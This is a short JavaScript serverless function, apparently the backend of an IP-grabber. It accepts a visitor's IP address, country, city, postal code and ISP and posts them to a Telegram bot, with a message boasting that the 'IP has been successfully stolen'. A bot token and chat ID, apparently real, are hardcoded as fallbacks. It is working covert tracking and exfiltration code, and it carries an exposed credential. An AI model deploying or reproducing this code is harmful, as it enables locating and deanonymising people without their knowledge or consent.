const axios = require('axios');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { ip, country, region, city, postal, org, isp } = JSON.parse(event.body);

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7642910841:AAFQTtl2sRrvZxXjYvuFnwI_g8pUIBWWFWc';
        const CHAT_ID = process.env.CHAT_ID || '5764387936';

        const message = `
⚡ IP has been successfully stolen! ⚡
🔹 IP: ${ip}
🌍 Country: ${country}
🏞️ Region: ${region}
🌆 City: ${city}
📮 Postal: ${postal}
🏢 Organization: ${org}
📡 ISP: ${isp}
🔐 Status: Data send complete ✅
        `.trim();

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Data IP berhasil dikirim ke Telegram!' })
        };

    } catch (error) {
        console.error('Server Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Terjadi kesalahan pada server.', error: error.message })
        };
    }
};
